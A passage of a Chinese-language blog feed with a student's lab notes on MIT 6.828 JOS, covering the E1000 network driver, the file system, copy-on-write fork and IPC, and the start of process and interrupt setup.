    <content type="html"><![CDATA[<h6 id="1-总体结构"><a href="#1-总体结构" class="headerlink" title="1. 总体结构"></a>1. 总体结构</h6><p>本实验主要组成部分如实验指导中的图所示</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2021/08/09/8LCv5AHj7GeahtQ.png" alt="ns" title="">                </div>                <div class="image-caption">ns</div>            </figure><p>E1000网卡对应的是数据链路层，Core network中的lwIP对应的是网络层与传输层，httpd对应的则是应用层。E1000 driver的实现是本实验的主要工作内容，它负责从E1000接收数据包或是发送数据包到E1000，此外几个helper也是我们需要实现的，它们使用ipc实现对network server数据包的收发，这些helper通过系统调用的方式与我们写的driver通信。这样一套完整协议模型主要是为了方便检验E1000 driver的实现正确与否，但我们对于网络协议的实现过程并不关心，所以直接使用了lwIP，这是一个轻量级的TCP/IP协议栈。</p><h6 id="2-E1000-driver"><a href="#2-E1000-driver" class="headerlink" title="2. E1000 driver"></a>2. E1000 driver</h6><p>E1000的manual：<a href="https://pdos.csail.mit.edu/6.828/2018/readings/hardware/8254x_GBe_SDM.pdf" target="_blank" rel="noopener">https://pdos.csail.mit.edu/6.828/2018/readings/hardware/8254x_GBe_SDM.pdf</a></p><ul><li><p>init</p><p>E1000网卡是PCI设备，在系统启动时会沿着PCI总线寻找存在的PCI设备，找到了就会调用事先注册了的初始化函数。这些初始化函数存储在pci_attach_vendor数组中，通过设备的vendor ID和device ID来确定调用哪个函数。这个数组单个元素构成如下所示。</p><p><img src="https://i.loli.net/2021/08/09/mbiH69FVYEjRrO2.png" alt="image-20210809153245907"></p><p>初始化函数共完成4件工作：</p><ul><li><p>启用设备为其分配资源</p><p>直接调用pci_func_enable函数。</p></li><li><p>映射设备寄存器到内存空间</p><p>调用mmio_map_region从为mmio留出的虚拟内存空间中割一块下来。</p></li><li><p>transmit相关寄存器初始化设置</p><p>参照manual 14.5节。</p></li><li><p>receive相关寄存器初始化设置</p><p>参照manual 14.4节。不过manual对于RDH和RDT初始化描述的不太准确，这两个寄存器其实存的并不是队列头尾地址，而是队列的索引，RDH为0，RDT为索引最大值。</p></li></ul></li><li><p>DMA</p><p>E1000 driver的作用是更高效地传递数据包，试想一下没有它的话，我们就只能通过直接读写E1000的寄存器来传输数据了，这无疑是低效率的。有了这个driver之后，它会维护两个循环队列，一个存储待transmit的数据包，另一个存储待receive的数据包，队列中的元素是描述符，除了包含数据包的内容还存有该数据包状态以及控制字段。这样的话只需要将这两个队列的指针和队列大小传递给E1000寄存器，E1000就能够读写driver内存中的数据包，事实上这正是init中设置寄存器中的一部分。循环队列使用头指针与尾指针来描述，在头指针与尾指针之间的就是可用的数据包，driver通过调节这2个指针来通知E1000数据包的处理情况。注意所有指针都需要使用物理地址，因为E1000是直接读写物理RAM的，不会经过MMU进行地址转换。以上就是DMA(直接内存存取)的描述。</p><ul><li><p>transmit</p><p>这个操作的方向是network server-&gt;E1000，也就是向外发送数据包。队列头指针指向的描述符是当前正被发送的数据包，尾指针指向的描述符是待添加的数据包。需要注意的是，尾指针指向的描述符包含的数据包不一定是空闲的，也有可能正被E1000处理，说明此时待发送的数据包已满，所以我们需要判断状态中的DD位是否为1，若为1才说明该数据包已处理完毕，若不为1的话driver就需要返回错误信息。在添加数据包到队列时，需要设置控制字段中的RS和EOP，前者是为了E1000在处理完数据包后自动设置DD位，后者标识数据包分片的结尾，因为本实验中不会出现大到需要分片的数据包，所以每次发送都可以设置。</p></li><li><p>receive</p><p>这个操作的方向是E1000-&gt;network server，也就是接收外来数据包。队列头指针指向的描述符是当前收到的数据包，尾指针指向的描述符包含的是刚接收过的数据包。因此receive中先将尾指针自增，再判断描述符状态中DD位是否为1，若不为1则说明当前队列是空的，需要返回错误信息。</p></li></ul></li></ul><h6 id="3-output-input-helper"><a href="#3-output-input-helper" class="headerlink" title="3. output/input helper"></a>3. output/input helper</h6><p>output比较简单，循环地调用ipc_recv接收network server发来的数据包，然后使用系统调用传给E1000 driver即可。</p><p>input需要维护一个队列，队列中每个元素大小为1页，取当前元素作为ipc_send的参数。这么做的原因是当input调用完ipc_send后就会继续去接收E1000传来的下一个包，然后立刻发送给network server，若是仍像output一样使用nsipcbuf来存储参数，那么可能network server还没处理完上一个包的内容，数据就已经被这个包给覆盖了。</p><h6 id="4-question-amp-code"><a href="#4-question-amp-code" class="headerlink" title="4. question &amp; code"></a>4. question &amp; code</h6><p>关于这部分的内容欢迎dalao斧正。</p><ul><li><p>How did you structure your transmit implementation? In particular, what do you do if the transmit ring is full?</p><p>队列未满时直接设置好RS与EOP，然后将数据包加入队列，再自增TDT。队列满了就返回失败信息。</p></li><li><p>How did you structure your receive implementation? In particular, what do you do if the receive queue is empty and a user environment requests the next incoming packet?</p><p>先自增RDT，再判断RDT对应描述符DD位，若为1则说明有包，拷贝到buf中并设置好size参数返回。队列为空则返回失败信息。因此input helper中需要循环调用recv包的系统调用直到接收到数据包。</p></li><li><p>What does the web page served by JOS’s web server say?</p><p>This file came from JOS.</p><p>Cheesy web page!</p></li><li><p>How long approximately did it take you to do this lab?</p><p>花费了大约3天，有1天时间浪费在实现receive中断上，但发现即使按manual上说的设置好了IMS和RDTR寄存器也不会产生中断，遂放弃。卡住我的另一个地方是RDH与RDT的设置上，按manual说的设置总是无法正常收到包。</p></li><li><p><a href="https://github.com/veltavid/mit-6.828-jos-study/tree/lab6" target="_blank" rel="noopener">https://github.com/veltavid/mit-6.828-jos-study/tree/lab6</a></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h6 id=&quot;1-总体结构&quot;&gt;&lt;a href=&quot;#1-总体结构&quot; class=&quot;headerlink&quot; title=&quot;1. 总体结构&quot;&gt;&lt;/a&gt;1. 总体结构&lt;/h6&gt;&lt;p&gt;本实验主要组成部分如实验指导中的图所示&lt;/p&gt;
&lt;figure class=&quot;image-bubble&quot;</summary>
      
    
    
    
    
    <category term="操作系统" scheme="https://veltavid.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>MIT-6.828-JOS-lab5实验笔记</title>
    <link href="https://veltavid.github.io/2021/082926dcf.html"/>
    <id>https://veltavid.github.io/2021/082926dcf.html</id>
    <published>2021-08-17T01:10:15.000Z</published>
    <updated>2021-08-17T08:27:40.245Z</updated>
    
    <content type="html"><![CDATA[<h6 id="1-文件系统基本结构"><a href="#1-文件系统基本结构" class="headerlink" title="1. 文件系统基本结构"></a>1. 文件系统基本结构</h6><ul><li><p>扇区与块</p><p>硬盘的存储以扇区为单位，在JOS中一个扇区大小是512字节，这个数字比较小，而磁盘又是低速设备，如果每次操作系统就读一个扇区的数据效率未免太低，因此在实现硬盘读写时操作系统是按若干个扇区进行一次操作的，这种单位被称为块，不难看出块大小一定是扇区大小的整数倍。在JOS中，块大小与页大小相同，都为4KB。</p></li><li><p>超级块</p><p>这是用来存储写死了的基本参数的地方，例如块大小，磁盘大小，或是描述根目录的数据，与项目中的配置文件功能类似。随文件系统的复杂程度超级块的数目也会不同，在JOS中我们只需要一块就能够记录完这些必要的数据，因此我们的第1个块就是超级块(第0块用于存储更基本的数据，如bootloader，页表等)。</p></li><li><p>文件元数据</p><p>所谓元数据就是描述数据的数据，与之前的许多lab相同，我们使用结构体来描述一个东西。File结构体的结构如下图所示</p><p><img src="https://i.loli.net/2021/08/05/uHJZ78OfL5s9MD3.png"></p><p>可以看出用于描述文件的属性有名字，大小，以及存储文件数据的块序号。不难看出文件数据的存储不是连续的，只是块内的数据连续，总体上是以块为单位散乱分布的，这种设计能够有效提供空间利用率。对于小文件，我们可以直接使用10个块序号来获取数据；而大文件也可以使用间接块指针获取一个存储了块序号的索引表来获取数据。在JOS中支持的最大文件大小为1034个块，约4.04MB。在现代操作系统中会使用更多级的索引来支持更大的文件。</p><p>此外，File结构体还可以用来描述文件夹，只是原本存储文件数据的块中变为存储代表文件的File结构体数组。二者通过File结构体中的f_type属性来区分。</p></li></ul><h6 id="2-文件系统"><a href="#2-文件系统" class="headerlink" title="2. 文件系统"></a>2. 文件系统</h6><ul><li><p>I/O权限控制</p><p>JOS实现用户读写磁盘的方法是启动一个特殊的用户进程，称为文件系统进程，专门赋予其IOPL权限，因此它能够执行in和out指令，而其他的用户进程都是无权进行磁盘I/O的，因此要进行磁盘读写只能通过IPC与文件系统进程通信来完成；在现代操作系统中实现磁盘I/O的部分则是在内核中的，通过驱动实现，为用户提供服务的接口就是系统调用。</p></li><li><p>块缓存</p><p>磁盘是低速设备，如果每次读写磁盘数据都要访问磁盘，即使按块访问效率也太低。因此文件系统进程将用到的磁盘数据写入到内存中以供其他进程访问，在内存中进行多次修改的开销将会远小于磁盘，直到执行刷新操作才将更改后的数据写回磁盘。在文件系统进程中，从0x10000000开始到0xD0000000总计3GB的虚拟内存空间都用于磁盘I/O，该进程的缺页处理函数会将读入了磁盘数据的物理页与这部分空间中的虚拟内存建立映射。因此JOS能支持的缓存大小为3GB。</p><p>要将磁盘中的3GB数据一次性读入内存是非常耗时的事情，因此JOS注册了一个缺页处理函数，只有当某个地址被访问到了，再从磁盘读入内存，这与高速缓存的实现思路相同，不同的地方是块缓存不会出现冲突而被换出的情况。</p></li><li><p>bitmap</p><p>这个数据结构用于记录每个块的空闲状态，每个块用1bit来表示，1为空闲，0为在使用，因此bitmap中每个元素可以存储32个块的状态。</p></li><li><p>文件操作</p><p>基本函数调用顺序：walk_path-&gt;dir_lookup-&gt;file_get_block-&gt;file_block_walk</p><ul><li><p>file_block_walk</p><p>获取指向某个文件中第n块的块序号指针。若n超过10，则需要到f_indirect中找，f_indirect为空的话则根据alloc设置与否决定是否分配块给f_indirect。</p></li><li><p>file_get_block</p><p>调用file_block_walk获取指向文件块序号的指针，如果指针指向一个空值，则为它分配一个块。</p></li><li><p>dir_lookup</p><p>遍历dir文件夹所有块中的File结构体，比较其name属性是否与要找的文件或文件夹相同。</p></li><li><p>walk_path</p><p>将path按’/‘分割得到一系列文件夹以及最终要找的文件，从超级块获得的根目录开始用dir_lookup寻找，每次找到了则下一回从新找到的目录继续找新的文件夹，直到最终找到文件。</p></li></ul><p>基本操作可分为文件开启创建操作，文件读写操作和针对块的操作，第一种调用walk_path寻找目标文件，第二种根据传入的File结构体按块操作即可，第三种调用file_block_walk找到目标块进行操作。</p></li><li><p>文件系统接口</p><p>在I/O权限控制中我们提到，JOS中只有文件系统进程拥有磁盘I/O操作权限，其他进程想要读写磁盘数据必须通过IPC与文件系统进程通信才行。</p><p>因此文件系统进程在初始化文件系统之后就会进入死循环，为发出请求的进程提供服务，发出请求的进程通过设置传递的值来选择要执行的文件操作，通过映射物理页来传递参数——服务器使用0x0ffff000映射到传递的参数。除了open操作需要映射客户端虚拟地址到物理页以外，其余操作都不需要，实际上open操作是共享了一个fd结构体，其结构如下图所示</p><p><img src="https://i.loli.net/2021/08/05/beiUOy5mjuknQNJ.png" alt="image-20210805221639617"></p><p>在共享了这个fd结构体之后，通信双方就能共享文件偏移，并且客户端能够通过文件id来指定要操作的文件。服务端使用一个OpenFile结构体数组来管理所有打开的文件，它是连接文件描述符fd与文件本身的桥梁。</p></li></ul><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2021/08/05/3BTSaLkHJfvlIAt.png" alt="image-20210805222631875" title="">                </div>                <div class="image-caption">image-20210805222631875</div>            </figure><p>​        当接收到客户端传来的文件id时以其为索引到OpenFile结构体数组中找出对应文件的File结构体，配合上一部        分中实现的文件操作函数完成读写等操作。最后操作的返回值通过ipc_send返回给客户端。</p><h6 id="3-spawn启动子进程"><a href="#3-spawn启动子进程" class="headerlink" title="3. spawn启动子进程"></a>3. spawn启动子进程</h6><p>spawn与fork很类似，区别在于fork创建的子进程与父进程执行的是同一个程序，spawn会加载其他程序然后在新建的子进程环境中运行。因此，fork需要拷贝(Copy-on-Write)父进程的内存，而spawn不需要。但有一些东西不论fork还是spawn创建的子进程都需要与父进程共享，例如文件描述符，如果不共享那么进程间将无法通过管道通信；还有各种共享库等等。这些需要共享的内存在映射时被设置的权限多加上一个PTE_SHARE，这意味着新建子进程的这部分虚拟内存只需要映射到父进程中对应虚拟内存已经映射的物理页即可。</p><h6 id="4-question-amp-code"><a href="#4-question-amp-code" class="headerlink" title="4. question &amp; code"></a>4. question &amp; code</h6><p>关于这部分的内容欢迎dalao斧正。</p><ul><li><p>Do you have to do anything else to ensure that this I/O privilege setting is saved and restored properly when you subsequently switch from one environment to another? Why?</p><p>不需要，因为标识I/O权限的标志位在eflags寄存器中，在切换进程环境时这个寄存器的值是存储在trapframe中的，不用担心会被切换后的进程破坏，切换回来时自然也可以正常从trapframe中恢复。</p></li><li><p><a href="https://github.com/veltavid/mit-6.828-jos-study/tree/lab5" target="_blank" rel="noopener">https://github.com/veltavid/mit-6.828-jos-study/tree/lab5</a></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h6 id=&quot;1-文件系统基本结构&quot;&gt;&lt;a href=&quot;#1-文件系统基本结构&quot; class=&quot;headerlink&quot; title=&quot;1. 文件系统基本结构&quot;&gt;&lt;/a&gt;1. 文件系统基本结构&lt;/h6&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;扇区与块&lt;/p&gt;
&lt;p&gt;硬盘的存储以扇区为单位，在JO</summary>
      
    
    
    
    
    <category term="操作系统" scheme="https://veltavid.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>MIT-6.828-JOS-lab4实验笔记</title>
    <link href="https://veltavid.github.io/2021/08df04b44a.html"/>
    <id>https://veltavid.github.io/2021/08df04b44a.html</id>
    <published>2021-08-17T01:10:10.000Z</published>
    <updated>2021-08-17T08:23:42.399Z</updated>
    
    <content type="html"><![CDATA[<h6 id="1-多处理器支持与多任务实现"><a href="#1-多处理器支持与多任务实现" class="headerlink" title="1. 多处理器支持与多任务实现"></a>1. 多处理器支持与多任务实现</h6><ul><li><p>映射mmio的虚拟内存</p><p>mmio是一种与设备通信的方式，它将虚拟内存地址映射到设备的物理内存空间，在这些虚拟内存上读写即可实现与外部设备的通信。因此我们需要空出一些虚拟内存空间留作此用。</p></li><li><p>lapic初始化</p><p>由于我们内核被装载的物理地址较低，所以我们之前一直是通过+0xf0000000的虚拟内存地址映射到内核的物理地址。但lapic所在物理地址从0xFE000000开始，我们不能使用这种方式了，此时上一步留出的虚拟内存空间就可以在这步用上了。</p><p>接下来的工作是设置lapic实现定时产生时钟中断，这部分设置主要是通过mmio与硬件设备通信实现，下文中CPU的设置也类似，只是通信方式还有pmio，由于涉及到许多与本实验无关的CPU内部细节，不具体分析了。</p></li><li><p>BSP启动APs</p><p>该部分完成的工作是由自举CPU(BSP)拉起其他的CPU(AP)，在本实验中BSP固定为第一个CPU。它会将启动用的汇编指令(kern/mpentry.S)拷贝到物理地址0x7000处，设置好mpentry.S所需的栈地址（这块内存在mem_init中完成映射），然后与对应AP通信使其执行这些指令，然后BSP就会阻塞直到该AP启动完毕。mpentry.S使CPU进入保护模式并启动分页功能，最后调用了mp_main。这里有一个问题：为何mp_main的调用需要使用间接调用。因为mpentry.S中的指令会被拷贝到虚拟地址0xf0007000处运行，而这是编译器无法得知的，若是使用直接调用那么编译器会计算下一条指令与mp_main的偏移然后生成机器码，但由于真实运行时的地址变了，那么这个偏移自然是不正确的，所以必须使用间接调用。总结一下就是当一段机器码要被拷贝到其他地方使用时，就必须避免其中出现计算偏移的指令。</p><p>mp_main中为该AP初始化lapic，加载GDT和段描述符，初始化并在GDT中设置TSS。随后将状态设置为CPU_STARTED，告知BSP启动已完毕。最后调用sched_yield任务调度函数，寻找一个待执行的任务给该AP执行。</p></li><li><p>加锁</p><p>经过上一步，我们此时已经有多个AP在同时执行任务了，它们随时可能由用户态转换至内核态，因此必须要考虑避免条件竞争问题，尤其是在内核使用了大量全局变量的情况。所以要在trap函数中以及所有sched_yield前加锁，在env_run最后进入用户态之前释放锁即可。</p><p>两种加锁的位置可以抽象成进程处于内核态的时机，一个进程除了在启动时处于内核态，就只有可能通过中断进入内核态，前者对应i386_init与mp_main中加锁，后者对应在trap中加锁。</p></li><li><p>任务调度算法</p><p>sched_yield采用的调度算法是轮询算法(Round-Robin)，这个算法的原理是从上一次位置的后一个开始，循环地查询到上回的位置处，这个过程中将遇到的第一个RUNNABLE任务作为本次执行的任务。若是没有找到任何RUNNABLE的任务，而且上回的任务仍然处于RUNNING状态，就继续执行上回的任务。</p></li></ul><h6 id="2-Copy-on-Write的fork实现"><a href="#2-Copy-on-Write的fork实现" class="headerlink" title="2. Copy-on-Write的fork实现"></a>2. Copy-on-Write的fork实现</h6><ul><li><p>多进程相关系统调用</p><p>在内核中需要实现一些多进程编程中可能会用到的系统调用，以方便用户调用。以下涉及到的所有进程均为当前进程或其子进程，涉及到的虚拟地址均为页对齐并且小于UTOP，涉及的权限设置中PTE_U 与PTE_P为必选，PTE_AVAIL与PTE_W为可选。不满足以上任意条件，我们的系统调用都会失败。</p><ul><li><p>sys_exofork</p><p>分配出一个env，并把当前env作为其父进程，随后将父进程的trapframe拷贝给它，只是eax设置成0。等之后CPU运行这个进程返回用户态时，会返回到和父进程相同的位置，只是返回值变为了0。</p></li><li><p>sys_env_set_status</p><p>允许用户更改某个进程的状态为ENV_NOT_RUNNABLE或ENV_RUNNABLE。</p></li><li><p>sys_page_alloc</p><p>分配一个物理页，并将用户指定的虚拟内存地址映射到其上。</p></li><li><p>sys_page_map</p><p>将某进程的某个虚拟内存地址映射到某进程的某个虚拟内存地址所映射的物理页。</p></li><li><p>sys_page_unmap</p><p>解除某进程中一处虚拟内存地址与物理页的映射关系。</p></li></ul></li><li><p>Copy-on-Write的意义</p><p>xv6中实现fork的方式是通过sys_exofork分配出子进程的env，然后调用sys_page_alloc与sys_page_map将子进程的虚拟内存都映射到物理页上，并将父进程的内存空间完整地拷贝到子进程的内存空间。这一步的开销是巨大的，每次fork都要消耗掉当前进程等量的物理页，然而子进程对这些内存空间可能并不会进行什么操作，例如shell中fork出的子进程主要负责调用execve系统调用执行命令，只是设置一下寄存器就进入内核态了，为子进程分配的物理页并没有派上实际用场。因此为了减少开销，对于fork出来的子进程我们让其与父进程共用物理页，只有当二者中有需要写入内存空间造成二者内存空间不一致时，我们再单独分配额外的物理页。</p></li><li><p>用户态缺页中断处理</p><p>在父进程fork出子进程后，它们映射的物理页权限都变为了COW，这意味着写入时会触发缺页中断。我们需要在page_fault_handler函数中实现用户态缺页中断的处理方法——之前我们只实现了内核态的处理。</p><p>用户态缺页中断处理的大体思路是将trapframe压入异常处理栈中，然后跳转到用户注册的异常处理函数（此时已经返回到用户态），这个函数负责调用真正处理异常的函数_pgfault_handler，处理完毕后无法回到内核态，必须直接在用户态下恢复原状态，因此要手动实现寄存器恢复与栈帧切换并返回发生缺页中断的那条指令，本实验中该函数为_pgfault_upcall。</p><p>缺页中断的情况可分为2种，一种是在缺页中断处理函数中又发生了缺页中断导致的嵌套中断，另一种是单纯的非嵌套中断。二者的区别在于发生异常时所使用的栈空间不同，前者使用的是异常处理栈，位于UTOP；后者使用的是用户栈。</p><ul><li><p>嵌套中断</p><p>在嵌套中断中，我们在压入trapframe之前还要多压入4字节的空白数据，这是因为_pgfault_upcall恢复所有寄存器的同时还要返回发生异常的地址，它必须要在发生异常时使用的栈上压入返回地址，这样才能在恢复esp之后正确地恢复eip。如果我们不多加这4字节，由于嵌套中断中异常处理栈和发生异常时的栈实际上连在一起的，那么在压入返回地址时就会覆盖异常处理栈帧中的trapframe最高的4字节即esp。</p><p><img src="https://i.loli.net/2021/08/02/hfKTayWSLCN59pX.png" alt="pgfault_handle_ret"></p></li><li><p>非嵌套中断</p><p>非嵌套中断中我们不需要多压这4字节，只需要将栈帧转移到异常处理栈中，然后再压入trapframe。因为发生异常时的esp-4处肯定是无用的数据。</p></li></ul></li><li><p>fork实现细节</p><p>以下是与dumbfork实现的不同之处。</p><ul><li><p>调用sys_pgfault_handler为父进程设置_pgfault_upcall与_pgfault_handler</p></li><li><p>duppage</p><p>先调用sys_page_map将父子进程的同一虚拟内存地址映射到同一物理页，并且此时子进程对应虚拟内存权限为COW。接下来将调用sys_page_map将父进程自身重新映射一遍，这步是为了修改父进程虚拟内存权限为COW。</p></li><li><p>pgfault</p><p>这是fork中被注册成_pgfault_handler的函数。大致工作流程为：将PFTEMP映射到一个新的物理页；我们把缺页中断所在页地址记作fault_va，然后将fault_va那一页数据拷贝到PFTEMP处；最后调用sys_page_map将fault_va映射到本进程PFTEMP对应的物理页，并设置权限为可写。由此可以看出做的工作是利用PFTEMP作为暂存数据的内存空间，实现了fault_va映射物理页的替换。</p></li><li><p>设置子进程_pgfault_upcall，由于子进程与父进程共用内存空间，因此不需要再设置_pgfault_handler</p></li></ul></li></ul><h6 id="3-进程间通信"><a href="#3-进程间通信" class="headerlink" title="3. 进程间通信"></a>3. 进程间通信</h6><ul><li><p>时钟中断</p><p>在第一部分的初始化工作中我们提到了用lapic来定时产生时钟中断，接下来这部分就要利用lapic产生的时钟中断实现CPU的时分复用了。</p><p>实现思路是为用户态进程的eflags寄存器设置FL_IF标志代表启用时钟中断，并在trapentry和trap_dispatch函数中添加对时钟中断的处理。具体来说就是当用户态进程接收到时钟中断时，会陷入内核把当前正处于RUNNING状态的任务改为RUNNABLE，然后调用lapic_eoi和sched_yield调度另一个合适的任务来执行。这样保证了每个任务都是按照分到的时间片来执行，没有哪个任务能够一直霸占CPU，时间片大小就是lapic产生时钟中断的间隔。最后要注意的一点，lapic_eoi的功能是向lapic发送接收到时钟中断的响应，因为x86架构CPU只有接收到响应才会产生下一个时钟中断。</p></li><li><p>进程间信息的发送与接收</p><ul><li><p>接收信息</p><p>进程通过系统调用sys_ipc_recv进入内核态，将进程对应的env中的env_ipc_receving标志位设为真表示处于接收信息状态，随后将自身进程状态改为ENV_NOT_RUNNABLE并调度另一个新任务。只有等到某个进程向它发送数据并将其状态改回ENV_RUNNABLE，它才有可能被CPU执行。</p></li><li><p>发送信息</p><p>这部分系统调用比较繁琐，大多是一些差错检查，若是发送方与接收方的虚拟内存地址都合法，则发送方虚拟内存地址对应的物理页会与接收方的虚拟内存地址建立映射关系，与sys_page_map的实现类似，否则就不映射物理页。无论是否映射物理页，最终都要把接收者的env_ipc_receving设置为假，env_ipc_from设置为自身的进程id，env_ipc_value设置成要发送的数据，env_status设置为ENV_RUNNABLE，且最重要的是要将接收方进程trapframe中的eax寄存器设为0来模拟正常返回用户态的情况。</p></li><li><p>一个小坑</p><p>在实现IPC时我发现即使设置了trapframe的eax为0，但用户态得到的返回值却为12，也就是sys_ipc_recv的调用号。一度困扰了我很久，最后发现问题出在env_run函数中，我们的sys_ipc_recv在设置了自身为NOT_RUNNABLE之后，又会因为env_run切换进程时设置回RUNNABLE。导致还没等到进程发送信息给它，它自身又运行起来最终没收到任何信息地返回了用户态，当然eax寄存器也是保持着调用时的原样为12。至此我明白了lab3中对env_run实现的提示，原来指的是还需要考虑当前进程为NOT_RUNNABLE的状态。</p></li></ul></li></ul><h6 id="4-question-amp-code"><a href="#4-question-amp-code" class="headerlink" title="4. question &amp; code"></a>4. question &amp; code</h6><p>这部分的内容欢迎dalao斧正。</p><ul><li><p>Compare <code>kern/mpentry.S</code> side by side with <code>boot/boot.S</code>. Bearing in mind that <code>kern/mpentry.S</code> is compiled and linked to run above <code>KERNBASE</code> just like everything else in the kernel, what is the purpose of macro <code>MPBOOTPHYS</code>? Why is it necessary in <code>kern/mpentry.S</code> but not in <code>boot/boot.S</code>? In other words, what could go wrong if it were omitted in <code>kern/mpentry.S</code>?</p><p>Hint: recall the differences between the link address and the load address that we have discussed in Lab 1.</p><p>因为mpentry.S中的指令及数据会被加载到MPENTRY_PADDR处再执行，因此相关数据的绝对地址要修改成加载后的地址，只需要将这些数据的偏移量加上MPENTRY_PADDR即可。如果没有MPBOOTPHYS，而是直接用它们在mpentry.S中的地址会导致访问不可用内存的错误。boot.S的加载地址与编译链接后的地址相同，所以不需要计算偏移与加载基址相加。</p></li><li><p>It seems that using the big kernel lock guarantees that only one CPU can run the kernel code at a time. Why do we still need separate kernel stacks for each CPU? Describe a scenario in which using a shared kernel stack will go wrong, even with the protection of the big kernel lock.</p><p>因为这把锁在最后调用env_pop_tf回到用户态前必须要释放，这意味着可能会有多个CPU同时执行env_pop_tf。如果所有CPU使用同一个栈空间，那么env_pop_tf所使用的参数会遭到破坏。</p></li><li><p>In your implementation of <code>env_run()</code> you should have called <code>lcr3()</code>. Before and after the call to <code>lcr3()</code>, your code makes references (at least it should) to the variable <code>e</code>, the argument to <code>env_run</code>. Upon loading the <code>%cr3</code> register, the addressing context used by the MMU is instantly changed. But a virtual address (namely <code>e</code>) has meaning relative to a given address context–the address context specifies the physical address to which the virtual address maps. Why can the pointer <code>e</code> be dereferenced both before and after the addressing switch?</p><p>因为envs是在mem_init中由boot_alloc分配出来的，位于内核的虚拟内存空间，内核虚拟地址与物理地址的转换方式固定为+-0xf0000000，这对于任何进程的页表来说都是如此，换言之任何页表0xf0000000之后的虚拟内存空间映射的都是相同的物理页，所以e的使用不受切换页表的影响。</p></li><li><p>Whenever the kernel switches from one environment to another, it must ensure the old environment’s registers are saved so they can be restored properly later. Why? Where does this happen?</p><p>因为转换到新的环境之后，新的进程会按照指令修改寄存器中的值，如果不保存转换之前寄存器的值，那么这些数据就永远地丢失了。保存寄存器值到trapframe中的操作在trapentry.S的_alltraps中完成，这是所有类型的中断都会执行的一段指令。</p></li><li><p><a href="https://github.com/veltavid/mit-6.828-jos-study/tree/lab4" target="_blank" rel="noopener">https://github.com/veltavid/mit-6.828-jos-study/tree/lab4</a></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h6 id=&quot;1-多处理器支持与多任务实现&quot;&gt;&lt;a href=&quot;#1-多处理器支持与多任务实现&quot; class=&quot;headerlink&quot; title=&quot;1. 多处理器支持与多任务实现&quot;&gt;&lt;/a&gt;1. 多处理器支持与多任务实现&lt;/h6&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;映射mmio的虚拟内存</summary>
      
    
    
    
    
    <category term="操作系统" scheme="https://veltavid.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>MIT-6.828-JOS-lab3实验笔记</title>
    <link href="https://veltavid.github.io/2021/08a277b212.html"/>
    <id>https://veltavid.github.io/2021/08a277b212.html</id>
    <published>2021-08-17T01:10:05.000Z</published>
    <updated>2021-08-17T08:26:36.509Z</updated>
    
    <content type="html"><![CDATA[<h6 id="1-进程环境建立"><a href="#1-进程环境建立" class="headerlink" title="1. 进程环境建立"></a>1. 进程环境建立</h6><p>第一部分的主要工作是将用户态执行的程序装载到内存中。为了与内核态区别开来，我们首先需要一种数据结构来管理用户态进程的相关环境信息，也就是Env结构体。在本部分中，我们初始化了一个env_free_list用于存储多个用户进程的环境信息，但在本实验中一次只会装载并执行一个用户程序。</p><p>Env映射的物理页由page_alloc分配，但这一步分配是在初始化env_free_list时就完成了的。真正要分配Env时内核所做的工作其实只是对env_free_list指向的Env进行初始化，并将其解下。</p><p>初始化时需要注意将内核中已建立的二级页表也拷贝给进程的二级页表，否则在从内核态转移至用户态时会发生page fault，但此时还未设置好异常处理，所以最终引发的是triple fault。这是因为在更改cr3为用户进程的二级页表后，还需要继续执行内核中的一系列pop指令并设置eip为用户程序的入口才能真正地转换到用户态，若用户进程页表中没有内核虚拟地址的相关映射关系，自然会发生page fault。初始化完二级页表后，还要将Env中各段寄存器的值设置成用户态地址空间的段选择子，最后从env_free_list上解下完成分配。</p><p>准备好了描述进程的Env，我们可以着手将硬盘上的二进制文件装载到内存中，这一步需要解析elf文件格式，分段映射到不同的物理页上。在映射时需要注意，我们存储映射关系的页表是用户进程所有的，而非内核的，因此我们需要更改cr3使当前生效的二级页表变为用户进程的，在映射完毕后再更改回内核的。映射完elf文件，还需要继续分配内存给用户栈，这样用户进程的内存布局才算完整了。最后将Env中用于上下文切换的Trapframe中的eip设置为程序入口点，这样内核才能正确地移交控制权。</p><h6 id="2-异常与中断处理"><a href="#2-异常与中断处理" class="headerlink" title="2. 异常与中断处理"></a>2. 异常与中断处理</h6><p>在上一部分中，我们实现了从内核态到用户态的转换。这一部分，我们要做的则是从用户态转换到内核态，相比于高权限到低权限，由低权限到高权限无疑要更加复杂。在操作系统中，这种转换只能通过中断完成，中断又分为外部中断与内部中断，外部中断主要是操作系统内核与外部设备通信的一种方式，在本实验中不会遇到；内部中断可进一步细分为软中断和异常，软中断是软件自己主动发起的中断，如int3、int80等，异常则是CPU内部执行时遇到错误发出的中断。我们接下来要实现的是内部中断的处理，由于软中断与异常的处理基本一致，我们接下来不对二者进行区分。</p><p>中断处理的基础数据结构是IDT(中断描述符表)，其中存储的描述符称为门。门描述符可分为中断门描述符，陷阱门描述符，任务门描述符和调用门描述符，后两者在实际应用中比较少见，因此可以忽略。前两个的区别主要在于中断门会将eflags寄存器IF位置0来屏蔽其他中断避免中断嵌套，而后者不会置0，其余的构成二者是一致的，都有段描述符选择子，段内偏移量和门描述符权限等。</p><p>因此我们在初始化idt时就要根据上述门描述符的结构来为每种中断设置好门描述符权限，和中断处理程序的偏移，段描述符选择子则统一为内核的代码段。中断处理程序的函数调用流程为trapEntry-&gt;trap-&gt;trap_dispatch，真正根据中断号执行不同异常处理的函数为trap_dispatch。trapEntry负责传递中断号，并根据不同中断是否带有error code来决定是否需要自行调整来保证各中断的栈帧结构相同，最后是保存用户态上下文环境。注意这个trapEntry对于每个中断来说是不同的，为了方便统一称为trapEntry。以下是各中断是否带有error code的情况。</p><figure 